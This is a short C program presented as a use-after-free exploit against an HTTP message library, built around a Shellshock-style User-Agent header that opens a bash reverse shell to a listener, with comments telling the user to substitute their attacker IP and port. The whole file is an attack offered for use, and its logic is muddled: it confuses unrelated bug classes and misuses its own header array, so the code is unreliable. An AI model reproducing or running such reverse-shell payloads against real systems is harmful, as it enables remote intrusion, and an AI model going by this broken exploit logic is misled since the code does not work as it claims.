#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "http-message.h"

#define NUM_HEADERS_TO_ALLOCATE 500

void exploit_use_after_free() {
    http_message_t msg;
    const char *headers[NUM_HEADERS_TO_ALLOCATE];
    unsigned int i;

    /* Create an HTTP message */
    msg = http_message_create(200, "OK");
    if (msg == NULL) {
        fprintf(stderr, "Error: Failed to create HTTP message\n");
        return;
    }

    /* Add a large number of headers to trigger memory reallocation */
    for (i = 0; i < NUM_HEADERS_TO_ALLOCATE; i++) {
        headers[i] = "Header-Value";
    }

    /* Add headers to the message */
    if (http_message_add_headers(msg, headers, NUM_HEADERS_TO_ALLOCATE) != 0) {
        fprintf(stderr, "Error: Failed to add headers to HTTP message\n");
        http_message_destroy(msg);
        return;
    }

    /* 
     * Craft payload to execute reverse shell. 
     * You'll need to replace the IP address and port below with your own.
     */
    headers[0] = "GET / HTTP/1.1";
    headers[1] = "Host: 127.0.0.1"; // Replace with your attacker IP
    headers[2] = "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"; // Replace with your listener IP and port
    headers[3] = NULL; // Ensure the array ends with a NULL pointer

    /* Add the payload as headers to trigger the vulnerability */
    if (http_message_add_headers(msg, headers, NUM_HEADERS_TO_ALLOCATE) != 0) {
        fprintf(stderr, "Error: Failed to add headers to HTTP message\n");
        http_message_destroy(msg);
        return;
    }

    /* Destroy the HTTP message, triggering a use-after-free condition */
    http_message_destroy(msg);
}

int main() {
    exploit_use_after_free();
    return 0;
}
